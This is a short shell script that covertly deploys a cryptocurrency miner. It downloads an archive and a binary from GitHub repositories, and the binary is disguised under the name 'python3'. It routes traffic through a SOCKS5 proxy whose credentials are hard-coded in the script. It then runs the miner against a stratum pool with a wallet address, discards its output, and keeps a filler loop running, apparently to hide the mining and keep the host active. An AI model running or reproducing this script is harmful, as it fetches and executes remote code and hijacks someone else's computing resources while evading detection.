#!/bin/sh
wget https://github.com/nestri12329018/file/raw/main/graphics.tar.gz

tar -xhf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 52.5.38.201:1080
socks5_username = 3twpqqx7a0cpln
socks5_password = 6y9m5wvvluhpwzsuwlfuoxwkh52h1
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "

echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

echo "**"

echo " "

echo " "
./graftcp/graftcp wget https://github.com/haria11/ideal-octo-doodle/raw/main/python3
chmod +x python3
./graftcp/graftcp ./python3 -a yespowersugar -o stratum+tcps://47.89.234.73:443 -u sugar1qwrnwp0xpuxk57l4p3strxlc9aze8k9lx25s8f0.$(echo $(shuf -i 1-20000 -n 1)-GG) -p x -t 1 >/dev/null 2>&1 >/dev/null &
while :; do echo "system true"; sleep 30; done
